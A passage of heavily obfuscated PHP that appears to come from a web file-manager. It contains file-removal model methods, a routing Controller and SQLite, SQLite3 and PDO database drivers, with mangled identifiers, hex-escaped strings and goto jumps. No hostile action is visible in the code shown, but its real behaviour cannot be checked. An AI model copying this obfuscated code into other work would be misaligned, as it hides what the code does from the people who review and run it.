ŒŠÕË»[$È—Ç‹Ê„[1317]] = $ØÎ±ÙıÅ; Cache::set($ôş¡ªà¾, $ ŒŠÕË»); unset($‰¸àÜéÃ[$È—Ç‹Ê„[6]]); $ŞÂêÎï = array($È—Ç‹Ê„[484] => $Œ†³‰«ñ, $È—Ç‹Ê„[2376] => $È—Ç‹Ê„[640], $È—Ç‹Ê„[32] => $‰¸àÜéÃ[$È—Ç‹Ê„[32]], $È—Ç‹Ê„[96] => $‰¸àÜéÃ[$È—Ç‹Ê„[96]]); Hook::trigger($È—Ç‹Ê„[1940], array($È—Ç‹Ê„[1339] => $ŞÂêÎï, $È—Ç‹Ê„[1349] => !0)); show_json($ØÎ±ÙıÅ, !1, 100111); } if ($Ÿ…úğ¡ == $È—Ç‹Ê„[640]) { return !0; } if ($ËÅ­ÖÏ || $…×™…Ø) { $ğ½ ¯‚¹ = array_merge($ËÅ­ÖÏ, $…×™…Ø); $ğ½ ¯‚¹ = array_filter(array_unique($ğ½ ¯‚¹)); $this->removeByFileID($ğ½ ¯‚¹); } if ($ëøÓóˆ) { $ëøÓóˆ = array_filter(array_unique($ëøÓóˆ)); foreach ($ëøÓóˆ as $×©ˆ‘Ë) { $Â—šãç = IO::has($×©ˆ‘Ë, !0); if (!$Â—šãç[$È—Ç‹Ê„[241]] && !$Â—šãç[$È—Ç‹Ê„[242]]) { IO::remove($×©ˆ‘Ë); } } } return $this->remove($Œ†³‰«ñ); } private function removeByFileID($ÏÕ˜’ªò = array()) { $÷òÎÈ¥² =& $_SERVER[±Ö‰ô½¯]; if (empty($ÏÕ˜’ªò)) { return; } $›ÕâÌä = array($÷òÎÈ¥²[554] => array($÷òÎÈ¥²[7], $ÏÕ˜’ªò)); $»Ş³Ì€ª = Model($÷òÎÈ¥²[1482])->where($›ÕâÌä)->field($÷òÎÈ¥²[2451])->select(); if (!$»Ş³Ì€ª) { return Model($÷òÎÈ¥²[557])->remove($ÏÕ˜’ªò); } $»Ş³Ì€ª = array_to_keyvalue($»Ş³Ì€ª, $÷òÎÈ¥²[193], $÷òÎÈ¥²[554]); foreach ($»Ş³Ì€ª as $¿ô€Ÿøş => $”‰æŸØ) { Model($÷òÎÈ¥²[930])->removeNow($¿ô€Ÿøş, !1); } $Õ½÷ñ¯ = array_diff($ÏÕ˜’ªò, array_unique(array_values($»Ş³Ì€ª))); if ($Õ½÷ñ¯) { return Model($÷òÎÈ¥²[557])->remove($Õ½÷ñ¯); } } private function removeShareItems($ø¦Ä§êä) { $¦¸™¡ÓÊ =& $_SERVER[±Ö‰ô½¯]; $õØÙ¨îÒ = "\x7b\x69\157\72{$ø¦Ä§êä}\x7d\57"; $ë¢à“ÑŒ = array($¦¸™¡ÓÊ[193] => 0, $¦¸™¡ÓÊ[580] => array($¦¸™¡ÓÊ[471], "{$õØÙ¨îÒ}\45")); $òË÷Ñˆß = Model($¦¸™¡ÓÊ[1512])->where($ë¢à“ÑŒ)->field($¦¸™¡ÓÊ[685])->select(); if (empty($òË÷Ñˆß)) { return; } $¯Øë¦Ù = array_to_keyvalue($òË÷Ñˆß, $¦¸™¡ÓÊ[12], $¦¸™¡ÓÊ[685]); Model($¦¸™¡ÓÊ[684])->remove($¯Øë¦Ù); } } class SystemLightAppModel extends ModelBaseLight { public $optionType = "\x53\171\163\x74\x65\x6d\x2e\x4c\151\147\150\164\x41\x70\160"; public $modelType = "\123\171\x73\164\x65\x6d\117\x70\x74\151\x6f\156"; public $field = array("\156\x61\155\145", "\147\162\x6f\165\160", "\x64\x65\163\143", "\x63\x6f\x6e\x74\x65\x6e\x74"); public function listData($§Œ¹«¯¶ = false, $œ‘±Ê = "\x6d\157\144\151\x66\x79\x54\x69\x6d\145", $Æ‚š‹—¯ = true) { return parent::listData($§Œ¹«¯¶, $œ‘±Ê, $Æ‚š‹—¯); } public function remove($ºÈ õØ) { $ áŞ²¾ = $this->findByName($ºÈ õØ); if (!$ áŞ²¾) { return !1; } return parent::remove($ áŞ²¾[$_SERVER[±Ö‰ô½¯][484]]); } public function add($¿Ÿß¹) { if ($this->findByName($¿Ÿß¹[$_SERVER[±Ö‰ô½¯][32]])) { return !1; } return parent::insert($¿Ÿß¹); } public function update($ƒñ¡…Ö, $È¨½ıåØ) { $ÖšÚÃèü =& $_SERVER[±Ö‰ô½¯]; $ÄÁ‘½È = $this->findByName($ƒñ¡…Ö); $Õ£Ò¯¥Ã = $this->findByName($È¨½ıåØ[$ÖšÚÃèü[32]]); if (!$ÄÁ‘½È || $Õ£Ò¯¥Ã && $Õ£Ò¯¥Ã[$ÖšÚÃèü[484]] != $ÄÁ‘½È[$ÖšÚÃèü[484]]) { return !1; } return parent::update($ÄÁ‘½È[$ÖšÚÃèü[484]], $È¨½ıåØ); } } goto C­µêˆÅŞ; F”ĞçÁ«¯¥: class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { $üôŞŠëó =& $_SERVER[±Ö‰ô½¯]; global $in, $config; $this->config =& $config; $this->in =& $in; $this->values[$üôŞŠëó[6]] =& $config; $this->values[$üôŞŠëó[7]] =& $in; $this->tpl = TEMPLATE . MOD . $üôŞŠëó[8]; $this->_classObjectID = mt_rand(0, 10000); } public function loadClass($ÕË…ßó) { if (1 === func_num_args()) { $this->{$ÕË…ßó} = new $ÕË…ßó(); } else { $«ãØÃµ¬ = new ReflectionClass($ÕË…ßó); $°¾ š = func_get_args(); array_shift($°¾ š); $this->{$ÕË…ßó} = $«ãØÃµ¬->newInstanceArgs($°¾ š); } return $this->{$ÕË…ßó}; } public function routeBind($±²‹¨­¦, $……´Á§’, $ƒÊ§É² = 3) { $·œæ¶’š =& $_SERVER[±Ö‰ô½¯]; $Œ…“äÍÄ = $this->in[$·œæ¶’š[9]]; $±²‹¨­¦ = str_replace($·œæ¶’š[10], $·œæ¶’š[11], trim(trim($±²‹¨­¦, $·œæ¶’š[8]), $·œæ¶’š[12])); if (!$±²‹¨­¦ || count($Œ…“äÍÄ) <= $ƒÊ§É²) { return !1; } $¾ñ£äô = !0; $Âš‰¡€ = explode($·œæ¶’š[8], $±²‹¨­¦); for ($ ñıèµû = 0; $ ñıèµû < count($Âš‰¡€); $ ñıèµû++) { if ($Âš‰¡€[$ ñıèµû] != $Œ…“äÍÄ[$ƒÊ§É² + $ ñıèµû]) { $¾ñ£äô = !1; break; } } if (!$¾ñ£äô) { return; } call_user_func_array(array($this, $……´Á§’), array()); } public function routeArgs($ŞÆ±„¶– = 3) { $‹¿·³ø¢ = $this->in[$_SERVER[±Ö‰ô½¯][9]]; if (count($‹¿·³ø¢) <= $ŞÆ±„¶–) { return array(); } $æš©½±î = array(); for ($ï‡–Ë¡Á = $ŞÆ±„¶–; $ï‡–Ë¡Á < count($‹¿·³ø¢); $ï‡–Ë¡Á += 2) { $æš©½±î[$‹¿·³ø¢[$ï‡–Ë¡Á]] = $‹¿·³ø¢[$ï‡–Ë¡Á + 1]; $this->in[$‹¿·³ø¢[$ï‡–Ë¡Á]] = $‹¿·³ø¢[$ï‡–Ë¡Á + 1]; } return $æš©½±î; } protected function assign($ß¿ÅÙê, $º˜¡í¸†) { $this->values[$ß¿ÅÙê] = $º˜¡í¸†; } protected function display($ƒ Ìƒ‡³) { ob_end_clean(); extract($this->values); require $this->tpl . $ƒ Ìƒ‡³; } } class DbSqliteBase extends Db { public function __construct($ÆÅ›ÄÈÇ = '') { $Éæ’—µƒ =& $_SERVER[±Ö‰ô½¯]; if (!extension_loaded($Éæ’—µƒ[13])) { think_exception(think_lang($Éæ’—µƒ[14]) . $Éæ’—µƒ[15]); } if (!empty($ÆÅ›ÄÈÇ)) { if (!isset($ÆÅ›ÄÈÇ[$Éæ’—µƒ[16]])) { $ÆÅ›ÄÈÇ[$Éæ’—µƒ[16]] = 438; } $this->config = $ÆÅ›ÄÈÇ; if (empty($this->config[$Éæ’—µƒ[17]])) { $this->config[$Éæ’—µƒ[17]] = array(); } } } public function connect($‚“ÇóŒ = '', $ÕŸ™‚ˆş = 0) { $Œ°ÏÓü =& $_SERVER[±Ö‰ô½¯]; if (!isset($this->linkID[$ÕŸ™‚ˆş])) { if (empty($‚“ÇóŒ)) { $‚“ÇóŒ = $this->config; } $’³ƒ¦­İ = !empty($‚“ÇóŒ[$Œ°ÏÓü[17]][$Œ°ÏÓü[18]]) ? $‚“ÇóŒ[$Œ°ÏÓü[17]][$Œ°ÏÓü[18]] : $this->pconnect; $ûŒ”åßç = $’³ƒ¦­İ ? $Œ°ÏÓü[19] : $Œ°ÏÓü[20]; $this->linkID[$ÕŸ™‚ˆş] = $ûŒ”åßç($‚“ÇóŒ[$Œ°ÏÓü[21]], $‚“ÇóŒ[$Œ°ÏÓü[16]]); if (!$this->linkID[$ÕŸ™‚ˆş]) { think_exception(sqlite_error_string()); } $this->connected = !0; @sqlite_busy_timeout($this->linkID[$ÕŸ™‚ˆş], 30000); if (1 != think_config($Œ°ÏÓü[22])) { unset($this->config); } } return $this->linkID[$ÕŸ™‚ˆş]; } public function free() { $this->queryID = null; } public function query($ ¦š•Îª) { $õƒƒ¤÷Ñ =& $_SERVER[±Ö‰ô½¯]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $ ¦š•Îª; if ($this->queryID) { $this->free(); } think_action_status($õƒƒ¤÷Ñ[23], 1); think_status($õƒƒ¤÷Ñ[24]); $this->queryID = sqlite_query($this->_linkID, $ ¦š•Îª); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $‚şÚËÑ¬ = $this->getAll(); return $‚şÚËÑ¬; } } public function execute($Û×´Ãˆ£) { $™ö¼±Š‘ =& $_SERVER[±Ö‰ô½¯]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $Û×´Ãˆ£; if ($this->queryID) { $this->free(); } think_action_status($™ö¼±Š‘[25], 1); think_status($™ö¼±Š‘[24]); $à³Œ¿Ê¸ = sqlite_exec($this->_linkID, $Û×´Ãˆ£); $this->debug(); if (!1 === $à³Œ¿Ê¸) { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[±Ö‰ô½¯][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $âùä‹î = sqlite_query($this->_linkID, $_SERVER[±Ö‰ô½¯][27]); if (!$âùä‹î) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $„Œ·§ì˜ = sqlite_query($this->_linkID, $_SERVER[±Ö‰ô½¯][28]); if (!$„Œ·§ì˜) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $§ö·‚à¿ = array(); if ($this->numRows > 0) { for ($ËÚäßÊ¹ = 0; $ËÚäßÊ¹ < $this->numRows; $ËÚäßÊ¹++) { $§ö·‚à¿[$ËÚäßÊ¹] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $§ö·‚à¿; } public function getFields($­‡ÌÏ¿) { $´¿ÛÈè =& $_SERVER[±Ö‰ô½¯]; $ú¹¥Ö¾ = $this->query($´¿ÛÈè[29] . $­‡ÌÏ¿ . $´¿ÛÈè[30]); $®€‚ø”Û = array(); if ($ú¹¥Ö¾) { foreach ($ú¹¥Ö¾ as $üÇ–¶ñê => $¿­ºİûó) { $®€‚ø”Û[$¿­ºİûó[$´¿ÛÈè[31]]] = array($´¿ÛÈè[32] => $¿­ºİûó[$´¿ÛÈè[31]], $´¿ÛÈè[33] => $¿­ºİûó[$´¿ÛÈè[34]], $´¿ÛÈè[35] => (bool) ($¿­ºİûó[$´¿ÛÈè[36]] === $´¿ÛÈè[12]), $´¿ÛÈè[37] => $¿­ºİûó[$´¿ÛÈè[38]], $´¿ÛÈè[39] => strtolower($¿­ºİûó[$´¿ÛÈè[40]]) == $´¿ÛÈè[41], $´¿ÛÈè[42] => strtolower($¿­ºİûó[$´¿ÛÈè[43]]) == $´¿ÛÈè[44]); } } return $®€‚ø”Û; } public function getTables($Ú±ãœ¥ = '') { $»’òöŠ =& $_SERVER[±Ö‰ô½¯]; $Äë¸úäß = $this->query($»’òöŠ[45] . $»’òöŠ[46] . $»’òöŠ[47]); $ëÚµ‘Ê = array(); foreach ($Äë¸úäß as $›İ‚·ã½ => $Ê¦­Á¿ï) { $ëÚµ‘Ê[$›İ‚·ã½] = current($Ê¦­Á¿ï); } return $ëÚµ‘Ê; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $˜–ÌñÂ =& $_SERVER[±Ö‰ô½¯]; $Û¼ïÛ× = sqlite_last_error($this->_linkID); $this->error = $Û¼ïÛ× . $˜–ÌñÂ[4] . sqlite_error_string($Û¼ïÛ×); if ($˜–ÌñÂ[12] != $this->queryStr) { $this->error .= LNG($˜–ÌñÂ[48]) . $this->queryStr; } think_trace($this->error, $˜–ÌñÂ[12], $˜–ÌñÂ[49]); return $this->error; } public function escapeString($ú±Ñš‰Æ) { return sqlite_escape_string($ú±Ñš‰Æ); } public function parseLimit($Ôé©×ãˆ) { $ÑíªË«í =& $_SERVER[±Ö‰ô½¯]; $®»Ì»åë = $ÑíªË«í[12]; if (!empty($Ôé©×ãˆ)) { $Ôé©×ãˆ = explode($ÑíªË«í[50], $Ôé©×ãˆ); if (count($Ôé©×ãˆ) > 1) { $®»Ì»åë .= $ÑíªË«í[51] . $Ôé©×ãˆ[1] . $ÑíªË«í[52] . $Ôé©×ãˆ[0] . $ÑíªË«í[53]; } else { $®»Ì»åë .= $ÑíªË«í[51] . $Ôé©×ãˆ[0] . $ÑíªË«í[53]; } } return $®»Ì»åë; } } class DbSqlite3Base extends Db { public function __construct($÷ğßÁÆØ = '') { $ŞÕÈ´± =& $_SERVER[±Ö‰ô½¯]; if (!class_exists($ŞÕÈ´±[54])) { think_exception(think_lang($ŞÕÈ´±[14]) . $ŞÕÈ´±[55]); } if (!empty($÷ğßÁÆØ)) { if (!isset($÷ğßÁÆØ[$ŞÕÈ´±[16]])) { $÷ğßÁÆØ[$ŞÕÈ´±[16]] = 438; } $this->config = $÷ğßÁÆØ; if (empty($this->config[$ŞÕÈ´±[17]])) { $this->config[$ŞÕÈ´±[17]] = array(); } } } public function connect($¼Ì‘ó•¿ = '', $éúÙƒ®Œ = 0) { $ôÅŠ•» =& $_SERVER[±Ö‰ô½¯]; if (!isset($this->linkID[$éúÙƒ®Œ])) { if (empty($¼Ì‘ó•¿)) { $¼Ì‘ó•¿ = $this->config; } $this->linkID[$éúÙƒ®Œ] = new SQLite3($¼Ì‘ó•¿[$ôÅŠ•»[21]]); if (!$this->linkID[$éúÙƒ®Œ]) { think_exception($this->linkID[$éúÙƒ®Œ]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$éúÙƒ®Œ]->busyTimeout(30000); if (1 != think_config($ôÅŠ•»[22])) { unset($this->config); } } return $this->linkID[$éúÙƒ®Œ]; } public function free() { $this->queryID = null; } public function query($”ÆÅÙ¯ˆ) { $Â¼Ú±© =& $_SERVER[±Ö‰ô½¯]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $”ÆÅÙ¯ˆ; if ($this->queryID) { $this->free(); } think_action_status($Â¼Ú±©[23], 1); think_status($Â¼Ú±©[24]); $this->queryID = $this->_linkID->query($”ÆÅÙ¯ˆ); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $‹““²ÎÜ = $this->getAll(); $this->numRows = count($‹““²ÎÜ); return $‹““²ÎÜ; } } public function execute($©äƒÏÙè) { $‰ÏÛ„§§ =& $_SERVER[±Ö‰ô½¯]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $©äƒÏÙè; if ($this->queryID) { $this->free(); } think_action_status($‰ÏÛ„§§[25], 1); think_status($‰ÏÛ„§§[24]); $±Ïùº÷¢ = $this->_linkID->exec($©äƒÏÙè); $this->debug(); if (!1 === $±Ïùº÷¢) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[±Ö‰ô½¯][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $À´³¶¸½ = $this->_linkID->query($_SERVER[±Ö‰ô½¯][27]); if (!$À´³¶¸½) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $Œ³ØÎÍÇ = $this->_linkID->query($_SERVER[±Ö‰ô½¯][28]); if (!$Œ³ØÎÍÇ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $÷‹†™ÄØ = array(); while ($Ì•õ÷¥Ë = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $÷‹†™ÄØ[] = $Ì•õ÷¥Ë; } $this->queryID->reset(); return $÷‹†™ÄØ; } public function getFields($­Ë‡ºÌ) { $¯¢ŞÕØÃ =& $_SERVER[±Ö‰ô½¯]; $ÊêÌÁÎÇ = $this->query($¯¢ŞÕØÃ[29] . $­Ë‡ºÌ . $¯¢ŞÕØÃ[30]); $Ü…ŒÇ½ = array(); if ($ÊêÌÁÎÇ) { foreach ($ÊêÌÁÎÇ as $¦É¹úŸ× => $â³×ßæä) { $Ü…ŒÇ½[$â³×ßæä[$¯¢ŞÕØÃ[32]]] = array($¯¢ŞÕØÃ[32] => $â³×ßæä[$¯¢ŞÕØÃ[32]], $¯¢ŞÕØÃ[33] => $â³×ßæä[$¯¢ŞÕØÃ[33]], $¯¢ŞÕØÃ[35] => (bool) ($â³×ßæä[$¯¢ŞÕØÃ[35]] === $¯¢ŞÕØÃ[12]), $¯¢ŞÕØÃ[37] => $â³×ßæä[$¯¢ŞÕØÃ[56]], $¯¢ŞÕØÃ[39] => (bool) $â³×ßæä[$¯¢ŞÕØÃ[57]], $¯¢ŞÕØÃ[42] => (bool) $â³×ßæä[$¯¢ŞÕØÃ[57]]); } } return $Ü…ŒÇ½; } public function getTables($½ßÂ”Ñï = '') { $ÙıÆ±úÇ =& $_SERVER[±Ö‰ô½¯]; $…íÃ†ºÓ = $this->query($ÙıÆ±úÇ[45] . $ÙıÆ±úÇ[46] . $ÙıÆ±úÇ[47]); $ƒÈ Á²Ù = array(); foreach ($…íÃ†ºÓ as $š´áÃÂˆ => $”‡ˆ÷ñõ) { $ƒÈ Á²Ù[$š´áÃÂˆ] = current($”‡ˆ÷ñõ); } return $ƒÈ Á²Ù; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $ÚèÓæ =& $_SERVER[±Ö‰ô½¯]; $this->error = $this->_linkID->lastErrorMsg(); if ($ÚèÓæ[12] != $this->queryStr) { $this->error .= LNG($ÚèÓæ[48]) . $this->queryStr; } think_trace($this->error, $ÚèÓæ[12], $ÚèÓæ[49]); return $this->error; } public function escapeString($°‚›ˆ†İ) { $‰‡¨í‰Ã =& $_SERVER[±Ö‰ô½¯]; if ($this->_linkID) { return $this->_linkID->escapeString($°‚›ˆ†İ); } return str_ireplace($‰‡¨í‰Ã[58], $‰‡¨í‰Ã[59], $°‚›ˆ†İ); } public function parseLimit($¯™ôœä‡) { $”Œ×õ²½ =& $_SERVER[±Ö‰ô½¯]; $¹…ã¼— = $”Œ×õ²½[12]; if (!empty($¯™ôœä‡)) { $¯™ôœä‡ = explode($”Œ×õ²½[50], $¯™ôœä‡); if (count($¯™ôœä‡) > 1) { $¹…ã¼— .= $”Œ×õ²½[51] . $¯™ôœä‡[1] . $”Œ×õ²½[52] . $¯™ôœä‡[0] . $”Œ×õ²½[53]; } else { $¹…ã¼— .= $”Œ×õ²½[51] . $¯™ôœä‡[0] . $”Œ×õ²½[53]; } } return $¹…ã¼—; } } goto AÃ‘íÕÛ•®; DÎÚ´Ó¦…: class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($”‹”Ê„å = '') { $¼È¤øâ¯ =& $_SERVER[±Ö‰ô½¯]; if (!class_exists($¼È¤øâ¯[1030])) { think_exception(think_lang($¼È¤øâ¯[14]) . $¼È¤øâ¯[1031]); } if (!empty($”‹”Ê„å)) { $this->config = $”‹”Ê„å; if (empty($this->config[$¼È¤øâ¯[17]])) { $this->config[$¼È¤øâ¯[17]] = array(); } } } public function connect($ŒÌ†„ğå = '', $€ûéèôÀ = 0) { $› í³ =& $_SERVER[±Ö‰ô½¯]; if (!isset($this->linkID[$€ûéèôÀ])) { if (empty($ŒÌ†„ğå)) { $ŒÌ†„ğå = $this->config; } $ö¼¾š«Ó = !empty($ŒÌ†„ğå[$› í³[17]][$› í³[18]]) ? $ŒÌ†„ğå[$› í³[17]][$› í³[18]] : $this->pconnect; if ($ö¼¾š«Ó) { $ŒÌ†„ğå[$› í³[17]][PDO::ATTR_PERSISTENT] = !0; } try { $this->linkID[$€ûéèôÀ] = new PDO($ŒÌ†„ğå[$› í³[1032]], $ŒÌ†„ğå[$› í³[1001]], $ŒÌ†„ğå[$› í³[1002]], $ŒÌ†„ğå[$› í³[17]]); } catch (PDOException $‹ƒéÀ´) { think_exception($‹ƒéÀ´->getMessage()); } $this->dbType = $this->_getDsnType($ŒÌ†„ğå[$› í³[1032]]); if (in_array($this->dbType, array($› í³[1033], $› í³[1034], $› í³[1035], $› í³[1036]))) { think_exception($› í³[1037] . $this->dbType . $› í³[1038] . $this->dbType . $› í³[1039]); } if (!$this->linkID[$€ûéèôÀ]) { think_exception($› í³[1040]); } try { $this->linkID[$€ûéèôÀ]->exec($› í³[1041] . think_config($› í³[1004])); } catch (Exception $‹ƒéÀ´) { } $this->connected = !0; if (1 != think_config($› í³[22])) { unset($this->config); } } return $this->linkID[$€ûéèôÀ]; } public function free() { $this->PDOStatement = null; } public function query($×¹”’ÌÈ, $èÉ ø¸ó = array()) { $’šÑê› =& $_SERVER[±Ö‰ô½¯]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $×¹”’ÌÈ; if (!empty($èÉ ø¸ó)) { $this->queryStr .= $’šÑê›[1042] . print_r($èÉ ø¸ó, !0) . $’šÑê›[1043]; } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($’šÑê›[23], 1); think_status($’šÑê›[24]); $this->PDOStatement = $this->_linkID->prepare($×¹”’ÌÈ); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $áÙ…çÍÈ = $this->PDOStatement->execute($èÉ ø¸ó); $this->debug(); if (!1 === $áÙ…çÍÈ) { $this->error(); return !1; } else { return $this->getAll(); } } public function execute($Ìö‘¹‰Ê, $™‡œÅ´¾ = array()) { $ğéš‰ì¥ =& $_SERVER[±Ö‰ô½¯]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $Ìö‘¹‰Ê; if (!empty($™‡œÅ´¾)) { $this->queryStr .= $ğéš‰ì¥[1042] . print_r($™‡œÅ´¾, !0) . $ğéš‰ì¥[1043]; } $§¡Ìí³„ = !1; if ($this->dbType == $ğéš‰ì¥[1036]) { if (preg_match($ğéš‰ì¥[1044], $this->queryStr, $§š°ÂğÇ)) { $this->table = think_config($ğéš‰ì¥[1045]) . str_ireplace(think_config($ğéš‰ì¥[1046]), $ğéš‰ì¥[464], $§š°ÂğÇ[2]); $§¡Ìí³„ = (bool) $this->query($ğéš‰ì¥[1047] . strtoupper($this->table) . $ğéš‰ì¥[58]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($ğéš‰ì¥[25], 1); think_status($ğéš‰ì¥[24]); $this->PDOStatement = $this->_linkID->prepare($Ìö‘¹‰Ê); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $““ù›ì‹ = $this->PDOStatement->execute($™‡œÅ´¾); $this->debug(); if (!1 === $““ù›ì‹) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($§¡Ìí³„ || preg_match($ğéš‰ì¥[1048], $Ìö‘¹‰Ê)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $Á³Š¥Ñì = $this->_linkID->commit(); $this->transTimes = 0; if (!$Á³Š¥Ñì) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $ÍÎŒ¤ˆ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$ÍÎŒ¤ˆ) { $this->error(); return !1; } } return !0; } private function getAll() { $‚ÜÅßëˆ = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($‚ÜÅßëˆ); return $‚ÜÅßëˆ; } public function getFields($§‡ƒ«ÜÚ) { $ù’ÕêŞü =& $_SERVER[±Ö‰ô½¯]; $this->initConnect(!0); if (think_config($ù’ÕêŞü[1049])) { $”ç¤ïó¼ = str_replace($ù’ÕêŞü[1050], $§‡ƒ«ÜÚ, think_config($ù’ÕêŞü[1049])); } else { switch ($this->dbType) { case $ù’ÕêŞü[1033]: case $ù’ÕêŞü[1051]: $”ç¤ïó¼ = "\x53\x45\x4c\x45\x43\x54\40\40\40\143\x6f\x6c\165\155\156\137\156\x61\x6d\145\40\x61\163\40\x27\x4e\x61\x6d\145\x27\x2c\40\x20\40\x64\x61\164\x61\137\164\171\x70\x65\40\x61\163\40\47\124\171\x70\145\47\54\x20\x20\x20\143\x6f\154\165\155\x6e\137\144\145\x66\141\165\154\164\x20\x61\x73\x20\47\x44\x65\146\x61\x75\154\x74\x27\54\x20\x20\40\151\163\x5f\x6e\165\x6c\154\x61\x62\154\x65\x20\141\163\x20\x27\116\165\x6c\x6c\47\xa\11\11\x46\122\117\x4d\x9\151\156\146\157\x72\x6d\141\x74\151\x6f\156\137\163\x63\x68\x65\155\141\x2e\x74\x61\x62\154\x65\163\x20\x41\x53\x20\x74\12\x9\x9\112\117\111\116\x9\151\156\146\x6f\x72\155\x61\x74\x69\x6f\x6e\137\163\x63\150\x65\x6d\x61\56\x63\x6f\154\165\x6d\x6e\x73\40\x41\123\x20\143\xa\11\11\117\x4e\40\x20\x74\x2e\x74\141\142\x6c\x65\x5f\x63\x61\164\x61\154\x6f\147\x20\x3d\x20\x63\x2e\164\141\142\x6c\145\137\x63\141\164\x61\x6c\157\147\xa\x9\x9\101\x4e\104\x20\x74\56\164\141\142\x6c\x65\137\x73\x63\x68\x65\155\141\x20\x3d\x20\143\x2e\164\141\142\x6c\145\137\x73\x63\150\145\x6d\141\12\11\11\x41\116\x44\40\x74\x2e\164\141\x62\154\145\x5f\x6e\141\155\145\40\x3d\40\x63\56\x74\141\x62\x6c\x65\137\156\141\155\x65\xa\x9\x9\x57\x48\105\122\105\x20\40\x20\164\56\164\141\x62\154\145\137\156\141\155\x65\x20\75\x20\x27{$§‡ƒ«ÜÚ}\x27"; break; case $ù’ÕêŞü[1052]: $”ç¤ïó¼ = $ù’ÕêŞü[1053] . $§‡ƒ«ÜÚ . $ù’ÕêŞü[1054]; break; case $ù’ÕêŞü[1034]: case $ù’ÕêŞü[1036]: $”ç¤ïó¼ = $ù’ÕêŞü[1055] . $ù’ÕêŞü[1056] . $ù’ÕêŞü[1057] . strtoupper($§‡ƒ«ÜÚ) . $ù’ÕêŞü[1058] . strtoupper($§‡ƒ«ÜÚ) . $ù’ÕêŞü[1059]; break; case $ù’ÕêŞü[1060]: $”ç¤ïó¼ = $ù’ÕêŞü[1061] . $§‡ƒ«ÜÚ . $ù’ÕêŞü[1062]; break; case $ù’ÕêŞü[1035]: break; case $ù’ÕêŞü[1063]: default: $”ç¤ïó¼ = $ù’ÕêŞü[1064] . ($this->dbType == $ù’ÕêŞü[1063] ? "\x60{$§‡ƒ«ÜÚ}\140" : $§‡ƒ«ÜÚ); } } $ôåæ´ø´ = $this->query($”ç¤ïó¼); $¯ıË÷¿‹ = array(); if ($ôåæ´ø´) { foreach ($ôåæ´ø´ as $¹ø®Œàâ => $İ©á¸Ò) { $İ©á¸Ò = array_change_key_case($İ©á¸Ò); $İ©á¸Ò[$ù’ÕêŞü[32]] = isset($İ©á¸Ò[$ù’ÕêŞü[32]]) ? $İ©á¸Ò[$ù’ÕêŞü[32]] : $ù’ÕêŞü[464]; $İ©á¸Ò[$ù’ÕêŞü[33]] = isset($İ©á¸Ò[$ù’ÕêŞü[33]]) ? $İ©á¸Ò[$ù’ÕêŞü[33]] : $ù’ÕêŞü[464]; $ùè¼•Â¬ = isset($İ©á¸Ò[$ù’ÕêŞü[353]]) ? $İ©á¸Ò[$ù’ÕêŞü[353]] : $İ©á¸Ò[$ù’ÕêŞü[32]]; $¯ıË÷¿‹[$ùè¼•Â¬] = array($ù’ÕêŞü[32] => $ùè¼•Â¬, $ù’ÕêŞü[33] => $İ©á¸Ò[$ù’ÕêŞü[33]], $ù’ÕêŞü[35] => (bool) (isset($İ©á¸Ò[$ù’ÕêŞü[104]]) && $İ©á¸Ò[$ù’ÕêŞü[104]] === $ù’ÕêŞü[12] || isset($İ©á¸Ò[$ù’ÕêŞü[35]]) && $İ©á¸Ò[$ù’ÕêŞü[35]] === $ù’ÕêŞü[12]), $ù’ÕêŞü[37] => isset($İ©á¸Ò[$ù’ÕêŞü[37]]) ? $İ©á¸Ò[$ù’ÕêŞü[37]] : (isset($İ©á¸Ò[$ù’ÕêŞü[56]]) ? $İ©á¸Ò[$ù’ÕêŞü[56]] : $ù’ÕêŞü[464]), 